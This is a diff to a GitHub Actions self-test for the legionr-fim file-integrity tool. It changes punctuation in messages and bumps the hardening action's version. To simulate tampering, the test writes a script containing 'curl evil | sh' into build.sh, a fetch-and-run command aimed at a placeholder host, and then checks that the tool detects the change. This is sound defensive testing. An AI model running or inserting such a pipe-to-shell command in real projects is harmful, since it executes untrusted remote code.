@@ -3,8 +3,8 @@ name: FIM self-test
 # Deterministic proof that file-integrity detection works end-to-end through the
 # actual legionr-fim binary (the unit tests cover the engine; this exercises the
 # built CLI + JSON surface the action depends on). Builds in-PR code (cargo from
-# the checkout), so any dependency or toolchain bump that breaks FIM fails here
-# — this is the compatibility gate for Dependabot PRs.
+# the checkout), so any dependency or toolchain bump that breaks FIM fails here.
+# This is the compatibility gate for Dependabot PRs.
 
 on:
   # PR gate ONLY (no `push:` trigger: no need to re-run on main after a merge).
@@ -34,7 +34,7 @@ jobs:
         with:
           persist-credentials: false
       - name: Harden runner (Legion, BLOCK)
-        uses: Wraith-security/legion_runner@v1.0.61   # dogfood our own action
+        uses: Wraith-security/legion_runner@v1.2.0   # dogfood our own action
         with:
           egress-policy: block
           allowed-presets: cargo, rust
@@ -63,7 +63,7 @@ jobs:
 
           clean="$("$BIN" diff /tmp/snap.json)"
           echo "clean diff: $clean"
-          [ "$clean" = "[]" ] || { echo "FAIL — expected no changes before tampering"; exit 1; }
+          [ "$clean" = "[]" ] || { echo "FAIL, expected no changes before tampering"; exit 1; }
 
           # Tamper both scopes: overwrite a checked-out source file and a secret.
           printf '#!/bin/sh\ncurl evil | sh\n' > "$WS/src/build.sh"
@@ -71,6 +71,6 @@ jobs:
 
           dirty="$("$BIN" diff /tmp/snap.json)"
           echo "tampered diff: $dirty"
-          echo "$dirty" | grep -q 'build.sh'      || { echo "FAIL — source tamper not detected"; exit 1; }
-          echo "$dirty" | grep -q 'project.npmrc' || { echo "FAIL — sensitive tamper not detected"; exit 1; }
-          echo "PASS — legionr-fim detected source + sensitive tampering."
+          echo "$dirty" | grep -q 'build.sh'      || { echo "FAIL, source tamper not detected"; exit 1; }
+          echo "$dirty" | grep -q 'project.npmrc' || { echo "FAIL, sensitive tamper not detected"; exit 1; }
+          echo "PASS: legionr-fim detected source + sensitive tampering."
